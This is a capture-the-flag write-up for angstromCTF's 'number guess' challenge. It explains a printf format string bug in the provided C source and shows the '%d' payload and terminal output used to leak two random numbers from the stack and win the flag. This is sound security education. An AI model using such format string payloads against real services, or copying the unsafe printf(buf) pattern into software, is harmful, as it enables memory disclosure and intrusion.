# number guess

### Descripttion
Ian loves playing number guessing games, so he went ahead and wrote one himself (source).
I hope it doesn't have any vulns. The service is running at nc shell.angstromctf.com 1235.

hint: Look up some vulnerabilities associated with the printf function.

### Solving

We have the executable and the source code, classic. And again the first thing I do - run the binary.

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
awawa
I&apos;m thinking of two random numbers (0 to 1000000), can you tell me their sum?
awawa&apos;s guess: 12323123
Sorry, the answer was 1375508. Try again :(
</pre>

The program generates two random numbers and asks me to guess their sum. Fine, let's see the source code now.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>


char *flag = "REDACTED";
char buf[50];

int main(int argc, char **argv) {

	
	puts("Welcome to the number guessing game!");
	puts("Before we begin, please enter your name (40 chars max): ");
	fflush(stdout);
	fgets(buf, 40, stdin);
	buf[strlen(buf)-1] = '\0';
		
	strcat(buf, "'s guess: ");	
	puts("I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?");
	
	srand(time(NULL));
	int rand1 = rand() % 1000000;
	int rand2 = rand() % 1000000;

	printf(buf);
	fflush(stdout);
	int guess;
	char num[8];
	fgets(num,8,stdin);
	sscanf(num,"%d",&guess);

	if (guess == rand1+rand2){
		printf("Congrats, here's a flag: %s\n", flag);
	} else {
		printf("Sorry, the answer was %d. Try again :(\n", rand1+rand2); 
	}
	fflush(stdout);
	return 0;
}
```

This code has ```printf``` vulnerability here:
```C
...
fgets(buf, 40, stdin);
...
printf(buf);
...
```
First, the program writes the string we enter to the stack, and after that it prints this string to stdout. The key is that ```printf``` function handles string format parameters. You can see this in the source code here:
```C
printf("Sorry, the answer was %d. Try again:(\n", rand1+rand2);
```
The string contains ```%d``` parameter which means that the ```printf``` must take second argument, which is ```rand1+rand2```, as a digit and insert it's value to the output. And that's why we dont's see %d in the output, but we see the number. But what if the string contains string format parameters but it's the only argument passed to ```printf```? There won't be an error, the function will just take values from the stack and here is the way for us to find those rand1 and rand2 numbers, because they are located in the stack of "main" function.

So, here what I'm gonna do. I will type this string:
```
%d %d %d %d %d %d %d %d %d %d %d %d %d %d
```
to the input. The program will print stack content to the stdout and I will lose the game to see what the sum was. Knowing the sum, I will find two numbers which will be equals to this value when summed:
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%d %d %d %d %d %d %d %d %d %d %d %d %d %d
I&apos;m thinking of two random numbers (0 to 1000000), can you tell me their sum?
-598746476 115 800219 -2090630696 -2090630592 -598746152 0 4196944 406424 -598746160 1362203648 4196944 -2094376313&apos;s guess: Sorry, the answer was 1206643. Try again :(
</pre>

Now I know the sum was ```1206643```. Next, I look for two numbers with equals sum. Here: ```800219``` and ```406424``` will be equals ```1206643``` when summed. So it's third and ninth numbers in the stack.

Now, to get the flag I will just get nine numbers from the stack and calculate the sum of third and ninth numbers:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%d %d %d %d %d %d %d %d %d
I&apos;m thinking of two random numbers (0 to 1000000), can you tell me their sum?
-20332 234 307952 -11714088 -11713984 -20008 0 4196944 189624&apos;s guess: 497576
Congrats, here&apos;s a flag: REDACTED
</pre>